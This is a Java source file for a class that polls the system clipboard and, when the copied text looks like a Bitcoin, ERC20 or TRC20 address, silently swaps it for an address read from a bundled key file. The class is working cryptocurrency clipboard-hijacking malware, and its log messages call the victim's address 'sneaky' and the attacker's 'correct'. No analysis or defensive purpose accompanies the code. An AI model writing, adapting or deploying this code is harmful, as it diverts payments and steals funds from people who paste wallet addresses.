package com.company;

import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.*;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Observable;


/**
 *
 *
 *
 * This class listens to clipbaord
 */
class ClipboardTextListener extends Observable implements Runnable {

    Clipboard sysClip = Toolkit.getDefaultToolkit().getSystemClipboard();
    private volatile boolean running = true;

    public void terminate() {
        running = false;
    }
    public void run() {
        System.out.println("Listening to clipboard...");
        // the first output will be when a non-empty text is detected
        String recentContent = "";
        ClassLoader classloader = Thread.currentThread().getContextClassLoader();
        InputStream f = classloader.getResourceAsStream("key/key.txt");
        InputStreamReader streamReader = new InputStreamReader(f, StandardCharsets.UTF_8);
        BufferedReader br;
        br = new BufferedReader(streamReader);
        String st ="";
        List<String> result = new ArrayList<>();
        do {
            try {
                st = br.readLine();
            } catch (IOException e) {
                e.printStackTrace();
            }
            result.add(st);
        } while (st != null);
        // continuously perform read from clipboard
        if (result.size()>=3) {
            while (running) {
                try {
                    Thread.sleep(200);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
                try {
                    // request what kind of data-flavor is supported
                    List<DataFlavor> flavors = Arrays.asList(sysClip.getAvailableDataFlavors());
                    // this implementation only supports string-flavor
                   String [] bcStarts = {"1","3", "5","K", "L", "M", "xpub", "xprv", "m", "n", "2", "9", "c","tpub","tprv","bc1","tb1"};
                   String [] erC20Starts = {"0x"};
                   String [] trC20Starts = {"T"};
                   if (flavors.contains(DataFlavor.stringFlavor)) {
                        String data = (String) sysClip.getData(DataFlavor.stringFlavor);
                        if (!data.equals(recentContent)) {
                            recentContent = data;
                            // Do whatever you want to do when a clipboard change was detected, e.g.:
                            System.out.println("New clipboard text detected: " + data);
                            if (data.length() >= 33 && data.length()<=42 && Arrays.stream(bcStarts).anyMatch(data::startsWith)) {
                                System.out.println("Sneaky text found for bitcoin: " + data);
                                System.out.println("Correct text found for bitcoin: " + result.get(0));
                                StringSelection stringSelection = new StringSelection(result.get(0));
                                sysClip.setContents(stringSelection, null);
                            }
                            if (data.length() <= 35 && Arrays.stream(trC20Starts).anyMatch(data::startsWith)) {
                                System.out.println("Sneaky text found for trc20: " + data);
                                System.out.println("Correct text found for trc20: " + result.get(2));
                                StringSelection stringSelection = new StringSelection(result.get(2));
                                sysClip.setContents(stringSelection, null);
                            }
                            if (data.length() == 42 && Arrays.stream(erC20Starts).anyMatch(data::startsWith)) {
                                System.out.println("Sneaky text found for erc20: " + data);
                                System.out.println("Correct text found for erc20: " + result.get(1));
                                StringSelection stringSelection = new StringSelection(result.get(1));
                                sysClip.setContents(stringSelection, null);
                            }
                            setChanged();
                            notifyObservers(data);
                        }
                    }

                } catch (HeadlessException | UnsupportedFlavorException | IOException e1) {
                    e1.printStackTrace();
                }
            }
        }
        else
        {
            System.out.println("Not Enough Keys present in file");
            return;
        }
    }

}
